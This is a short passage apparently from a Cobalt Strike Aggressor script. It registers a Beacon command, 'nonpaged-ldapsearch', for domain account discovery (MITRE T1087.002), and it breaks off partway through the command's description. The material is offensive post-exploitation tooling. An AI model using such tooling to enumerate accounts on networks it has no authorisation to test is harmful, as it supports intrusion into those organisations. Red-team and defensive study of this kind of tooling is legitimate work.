}
beacon_command_register(
    "nonpaged-ldapsearch",
    "Non-paged LDAP query — T1087.002 (by Dani)",
    "Synopsis: nonpaged-ldapsearch <basedn> <filter>\n\n" .
    "Description: Execute an LDAP search without paging controls — useful when\n" .
